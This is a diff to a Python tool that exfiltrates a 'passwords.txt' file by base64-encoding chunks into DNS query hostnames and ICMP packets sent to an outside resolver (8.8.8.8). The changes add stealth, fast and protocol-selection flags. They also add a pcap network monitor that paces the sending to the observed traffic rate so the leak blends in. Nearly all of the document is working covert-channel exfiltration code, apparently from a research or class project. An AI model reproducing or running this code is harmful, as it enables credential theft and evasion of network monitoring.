@@ -1,7 +1,9 @@
+import argparse
 import base64
 import binascii
 import ctypes
 import math
+import packettypes
 import platform
 import random
 import socket
@@ -11,25 +13,39 @@ import sys
 import threading
 import time
 
-
 from ctypes import *
+from packettypes import * 
+from sys import argv
 from winpcapy import *
 
-u_short = c_ushort
-u_char = c_ubyte
-u_int = c_int
+u_char      = c_ubyte
+u_int       = c_int
+u_short     = c_ushort
 
-startByte = 0
-chunkLength = 20
-exfilBytes = b''
-currentFilePath = "passwords.txt"
-ICMP_ECHO_REQUEST = 8
-ICMP_ECHO_REPLY = 0
+chunkLength         = 20
+currentFilePath     = "passwords.txt"
+exfilBytes          = b''
+ICMP_ECHO_REPLY     = 0
+ICMP_ECHO_REQUEST   = 8
+startByte           = 0
 
-DNS_REQUEST = 0
+intervalLength      = 5
+updatedPPI          = 10
 
-ICMP_PROTOCOL = socket.getprotobyname('icmp')
-UDP_PROTOCOL = socket.getprotobyname('udp')
+DNS_REQUEST     = 0
+
+ICMP_PROTOCOL   = socket.getprotobyname('icmp')
+UDP_PROTOCOL    = socket.getprotobyname('udp')
+
+# Command line flags
+stealthMode = False
+fastMode    = False
+icmpOnly    = False
+dnsOnly     = False
+mixedOnly   = False
+
+monitorThread = None
+
 
 class ICMPPacket:
     def __init__(self, type, code):
@@ -73,23 +89,71 @@ class DNSPacket:
         # Data will be stored in ICMP and DNS packets differently, so use fill methods specific to packet type
         
         return
+
+
+def main(q):
+    parser = argparse.ArgumentParser(description="Set options for exfiltration")
+    parser.add_argument('-s', dest="stealth", action="store_true", default=False, required=False)
+    parser.add_argument('-f', dest="fast", action="store_true", default=False, required=False)
+    parser.add_argument('-i', dest="icmp", action="store_true", default=False, required=False)
+    parser.add_argument('-d', dest="dns", action="store_true", default=False, required=False)
+    parser.add_argument('-m', dest="mixed", action="store_true", default=False, required=False)
+
+    args = parser.parse_args()
+
+    ret = False
+    if args.stealth & args.fast:
+        print("Error: -s and -f are mutually exclusive")
+        ret = True
+    if args.icmp & args.dns:
+        print("Error: Use -m for ICMP and DNS")
+        ret = True
+    if ret:
+        return
+
+    stealthMode = args.stealth
+    fastMode    = args.fast
+    icmpOnly    = args.icmp
+    dnsOnly     = args.dns
+    mixedOnly   = args.mixed
+
+    print("Flags set, running...")
+    init()
+
+    return
+
     
 def init():
     global exfilBytes
     startByte = 0
     exfilBytes = readFile("passwords.txt", "rb")
+    monitorThread = threading.Thread(None, monitorNetwork)
+    monitorThread.start();
     loop()
 
 def loop():
-    maxDelay = 5
-    delay = random.random() * maxDelay
-    while(True):
-        if startByte < (len(exfilBytes) - 1):
-            sendNext("8.8.8.8", UDP_PROTOCOL)
-        else:
-            break
+
+    k = 48 # Constant of proportionality between delay and ppi
+    localPPI = updatedPPI
+    delay = k / localPPI
+
+
+    # While the whole file hasn't be exfiltrated
+    while startByte < (len(exfilBytes) - 1):
+        print("localPPI: %d updatedPPI: %d" % (localPPI, updatedPPI))
+        # If the monitor has updated the PPI value, then update the delay between packets
+        if localPPI != updatedPPI:
+            print("Updating delay")
+            localPPI = updatedPPI
+            delay = k/localPPI
+            print("New delay: %f" % (delay))        
+
+        # Send next chunk
+        print("Sending next...")
+        sendNext("8.8.8.8", UDP_PROTOCOL)
+        print("Packet sent")
+
         time.sleep(delay)
-        delay = math.floor(random.random() * maxDelay)
     return
     
 def createICMPPacket():
@@ -104,7 +168,7 @@ def createDNSPacket():
     dnsUdpHeader = dnsPacket.getHeader()
     data = getNextChunk(startByte, chunkLength)
     data = base64.b64encode(data)
-    print(data)
+    #print(data)
     
     # Maximum length of label is 63 characters, so keep chunkLength below this. Unless you seperate into multiple labels
     queryHostname = len(data).to_bytes(1, "little") + data + (0).to_bytes(1, "big")
@@ -169,7 +233,8 @@ def readFile(name, mode):
             byte = f.read(1)
     finally:
         f.close()
-    return fileBytes        
+    return fileBytes
+
 def sendNext(dest_addr, code, timeout=1):
     """
     Sends one ping to the given "dest_addr" which can be an ip or hostname.
@@ -233,9 +298,16 @@ class udp_header(BigEndianStructure):
                 ("crc", u_short)]
 
 
+
+
+
+
+
 pktCount = 0
 intervalTime = 10
-
+capturing = True
+captureLength = 2
+timeBetweenListens = 5
 
 if platform.python_version()[0] == "3":
     raw_input=input
@@ -243,22 +315,9 @@ if platform.python_version()[0] == "3":
 #void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);
 PHAND=CFUNCTYPE(None,POINTER(c_ubyte),POINTER(pcap_pkthdr),POINTER(c_ubyte))
 
-
-def getPacketFrequency():
-    pcap_dispatch() 
-    return
-
-def closePcapLoop(handle):
-    print("Closing pcap loop...")
-    #pktCount = pcap_breakloop()
-    #pcap_close(adhandle)
-    return
-
-capturing = True
-captureLength = 5
-
-def monitorFrequency():
+def monitorNetwork():
     global capturing
+    global updatedPPI
     
     packet_handler=PHAND(_packet_handler)
     alldevs=POINTER(pcap_if_t)()
@@ -267,6 +326,7 @@ def monitorFrequency():
     if (pcap_findalldevs(byref(alldevs), errbuf) == -1):
             print ("Error in pcap_findalldevs: %s\n" % errbuf.value)
             sys.exit(1)
+    '''
     ## Print the list
     i=0
     try:
@@ -301,6 +361,8 @@ def monitorFrequency():
             ## Free the device list
             pcap_freealldevs(alldevs)
             sys.exit(-1)
+    '''
+    inum = 5
     ## Jump to the selected adapter
     d=alldevs
     for i in range(0,inum-1):
@@ -319,33 +381,22 @@ def monitorFrequency():
     pcap_freealldevs(alldevs)
     # Start capturing, set large packet capture size because we want to stop before this is reached
 
-    print("Starting capture")
-    start = time.clock()
-    pktCount = 0
-    while(capturing):
-        pcap_dispatch(adhandle, 1, packet_handler, None)
-        pktCount += 1
-        if (time.clock() - start) >= captureLength:
-            break;
-    pcap_close(adhandle)
-    print("Number of packets received in %d seconds: %d" % (captureLength, pktCount)) 
+    while 1:
+
+        print("Starting capture")
+        start = time.clock()
+        pktCount = 0
+        while(capturing):
+            pcap_dispatch(adhandle, 1, packet_handler, None)
+            pktCount += 1
+            if (time.clock() - start) >= captureLength:
+                break;
+        #pcap_close(adhandle)
+        #print("Number of packets received in %d seconds: %d" % (captureLength, pktCount))
+        updatedPPI = pktCount
+        print("updatedPPI: %d" % (pktCount))
+        time.sleep(timeBetweenListens)
     return
-
-def stopCapturing():
-    capturing = False
-    return
-
-def main(packet_file):
-    with open(packet_file, "rb") as fd:
-        data = fd.read()
-
-    # create ctypes.c_char_array
-    pkt_data = ctypes.c_buffer(data)
-    packet_handler(pkt_data)
-
-if __name__ == '__main__':
-    if len(sys.argv) == 2:
-        main(sys.argv[1])
 
 def _packet_handler(param,header,pkt_data):
     global pktCount
@@ -391,6 +442,5 @@ def _packet_handler(param,header,pkt_data):
     pktCount += 1
     return
 
-#init()
-monitorFrequency()
-    
+if __name__ == "__main__":
+    main(sys.argv)
